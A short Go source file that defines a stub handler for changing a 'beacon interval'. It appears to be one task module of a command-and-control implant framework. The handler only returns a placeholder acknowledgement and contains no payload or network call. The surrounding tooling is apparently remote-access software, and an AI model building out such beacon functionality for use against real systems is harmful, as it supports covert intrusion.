package tasks

import (
	"fmt"
	"time"
)

// SleepHandler changes the beacon interval
func SleepHandler(task *Task, tun interface{}) TaskResult {
	seconds, ok := task.Args["seconds"].(float64)
	if !ok {
		return TaskResult{
			TaskID:    task.ID,
			Status:    "error",
			Error:     "seconds argument required",
			Timestamp: time.Now().Unix(),
		}
	}
	
	// In a real implementation, this would update the global config
	// For now, we just acknowledge the command
	result := map[string]interface{}{
		"old_interval": "45s", // placeholder
		"new_interval": fmt.Sprintf("%ds", int(seconds)),
		"message":      fmt.Sprintf("Beacon interval updated to %d seconds", int(seconds)),
	}

	return TaskResult{
		TaskID:    task.ID,
		Status:    "success",
		Result:    result,
		Timestamp: time.Now().Unix(),
	}
}